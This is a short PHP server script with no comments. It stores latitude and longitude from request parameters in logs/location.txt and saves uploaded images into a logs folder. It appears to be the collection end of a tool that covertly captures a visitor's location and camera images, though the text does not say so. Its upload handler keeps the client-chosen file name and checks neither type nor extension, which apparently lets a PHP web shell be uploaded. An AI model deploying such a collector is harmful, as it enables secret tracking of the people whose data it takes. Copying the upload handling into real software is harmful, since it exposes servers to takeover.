<?php
if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['lat']) && isset($_GET['lon'])) {
    file_put_contents("logs/location.txt", "Lat: " . $_GET['lat'] . "\nLon: " . $_GET['lon']);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['image'])) {
    $filename = basename($_FILES['image']['name']);
    move_uploaded_file($_FILES['image']['tmp_name'], "logs/" . $filename);
}
?>
